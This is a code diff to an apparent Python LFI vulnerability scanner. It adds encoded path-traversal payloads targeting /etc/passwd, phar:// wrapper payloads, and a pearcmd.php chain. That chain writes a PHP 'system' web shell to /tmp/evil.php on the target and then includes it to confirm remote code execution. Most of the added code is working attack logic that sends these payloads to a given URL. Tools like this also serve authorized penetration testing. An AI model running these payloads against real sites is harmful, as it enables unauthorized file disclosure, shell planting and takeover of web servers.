@@ -1,9 +1,11 @@
-import re, os
-from typing import Optional, Dict, List
+import os
+import re
+from typing import Dict, List, Optional
+
 import requests
 
-from tools.log_utils import get_logger
 from tools.http_client import build_url
+from tools.log_utils import get_logger
 from tools.payload_engine import generate
 from tools.settings import settings
 from tools.verification_oracle import ConfidenceVoter
@@ -21,6 +23,25 @@ EVIDENCE_PATTERNS = [
     (r"www-data|xfs|nobody|daemon|bin:", "/etc/passwd"),
     (r"uid=\d+\([\w]+\)", "cmd_exec"),
     (r"gid=\d+\([\w]+\)", "cmd_exec"),
+]
+
+PHAR_WRAPPER_PAYLOADS = [
+    "phar://uploads/image.jpg",
+    "phar://uploads/evil.zip",
+    "phar://./uploads/image.gif",
+    "php://filter/convert.base64-encode/resource=phar://uploads/evil.zip",
+]
+
+PEARCMD_PAYLOAD = "/usr/share/php/pearcmd.php?+config-create+/<?=system('id')?>+/tmp/evil.php"
+
+ENCODING_BYPASS_PAYLOADS = [
+    "%2e%2e%2fetc%2fpasswd",
+    "%252e%252e%252fetc%252fpasswd",
+    "..%c0%ae%c0%ae/etc/passwd",
+    "..%c0%ae%c0%ae%c0%afetc/passwd",
+    "..%252f..%252f..%252fetc/passwd",
+    "....//....//....//etc/passwd",
+    "..\\/..\\/..\\/etc/passwd",
 ]
 
 SESSION_POISON_PATHS = [
@@ -155,10 +176,68 @@ class LFIScanner:
                 logger.debug("lfi session poison %s: %s", sess_path_tpl, e)
         return results
 
+    def check_phar_wrappers(self, url: str, param: str) -> List[Dict]:
+        results = []
+        for payload in PHAR_WRAPPER_PAYLOADS:
+            try:
+                r = self.sess.get(build_url(url, param, payload),
+                                  timeout=self.timeout)
+                if "LFI_TEST_SUCCESS" in r.text or len(r.text) > 100:
+                    results.append({"payload": payload[:35], "type": "phar_deserialization",
+                                    "size": len(r.text)})
+            except Exception as e:
+                logger.debug("lfi phar %s: %s", payload[:20], e)
+        return results
+
+    def check_pearcmd(self, url: str, param: str) -> List[Dict]:
+        results = []
+        try:
+            r = self.sess.get(build_url(url, param, PEARCMD_PAYLOAD),
+                              timeout=self.timeout)
+            if "uid=" in r.text or "LFI_TEST" in r.text or len(r.text) > 100:
+                results.append({"payload": "pearcmd.php", "type": "pearcmd_rce",
+                                "size": len(r.text)})
+        except Exception as e:
+            logger.debug("lfi pearcmd: %s", e)
+
+        poc_payload = "/usr/share/php/pearcmd.php?+config-create+/<?=system('id')?>+/tmp/evil.php"
+        try:
+            self.sess.get(url, params={param: poc_payload}, timeout=self.timeout)
+        except Exception:
+            pass
+        include_path = "/tmp/evil.php"
+        try:
+            r2 = self.sess.get(build_url(url, param, include_path), timeout=self.timeout)
+            if "uid=" in r2.text:
+                results.append({"payload": "pearcmd+rce", "type": "pearcmd_rce_chain",
+                                "size": len(r2.text)})
+        except Exception as e:
+            logger.debug("lfi pearcmd include: %s", e)
+        return results
+
+    def check_encoding_bypass(self, url: str, param: str) -> List[Dict]:
+        results = []
+        for payload in ENCODING_BYPASS_PAYLOADS:
+            try:
+                r = self.sess.get(build_url(url, param, payload),
+                                  timeout=self.timeout)
+                for pat, label in EVIDENCE_PATTERNS:
+                    if re.search(pat, r.text):
+                        results.append({"payload": payload[:30], "label": label,
+                                        "size": len(r.text), "status": r.status_code,
+                                        "type": "encoding_bypass"})
+                        break
+            except Exception as e:
+                logger.debug("lfi encoding %s: %s", payload[:20], e)
+        return results
+
     def check(self, url: str, param: str) -> Dict:
         result = {"vulnerable": False, "rce_available": False, "findings": []}
         result["findings"].extend(self.check_traversal(url, param))
+        result["findings"].extend(self.check_encoding_bypass(url, param))
         result["findings"].extend(self.check_php_wrappers(url, param))
+        result["findings"].extend(self.check_phar_wrappers(url, param))
+        result["findings"].extend(self.check_pearcmd(url, param))
         result["findings"].extend(self.check_log_poison(url, param))
         result["findings"].extend(self.check_proc_fd_bruteforce(url, param))
         result["findings"].extend(self.check_session_poison(url, param))
@@ -177,6 +256,14 @@ class LFIScanner:
             elif ftype == "rce_data":
                 voter.add_vote("wrapper_rce", 0.7)
                 result["rce_available"] = True
+            elif ftype == "phar_deserialization":
+                voter.add_vote("phar_wrapper", 0.85)
+                result["rce_available"] = True
+            elif ftype == "pearcmd_rce" or ftype == "pearcmd_rce_chain":
+                voter.add_vote("pearcmd_rce", 0.9)
+                result["rce_available"] = True
+            elif ftype == "encoding_bypass":
+                voter.add_vote("encoding_bypass", 0.6)
             elif "rce" in ftype or f.get("label") == "cmd_exec":
                 voter.add_vote("rce_other", 0.7)
                 result["rce_available"] = True
